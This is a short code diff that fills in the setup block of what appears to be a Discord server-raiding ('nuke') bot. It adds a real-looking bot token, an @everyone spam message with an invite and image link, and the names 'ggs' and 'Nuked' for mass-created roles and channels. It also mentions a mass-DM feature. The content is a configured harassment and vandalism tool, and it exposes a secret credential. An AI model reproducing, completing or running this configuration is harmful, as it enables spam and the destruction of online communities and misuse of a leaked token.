@@ -11,11 +11,11 @@ intents.members = True
 
 ###########SETUP###############
  = "?"                                                       #
-token = "TOKEN"                                            #
-spam_messages = "Spam message"         #
+token = "MTEzNzkzOTM3MjcwNTA1NDc3MA.GvTEBv.tHbuFLqEwwENJXnzs3ioOyVZO-q7QB4ZCVB17U"                                            #
+spam_messages = "@everyone https://discord.gg/Jf72x52jms [GangBangers](https://media.discordapp.net/attachments/1155261662123802725/1155266346712567869/Screenshot_20230916_122744_CapCut.jpg)         #
 massdm = "Currently broken.."                    #
-rolenames = "Role Names To Spam"         #                                                            
-channels = "Channels To Spam Names"  #
+rolenames = "ggs"         #                                                            
+channels = "Nuked"  #
 ##############################
 
 def Clear():
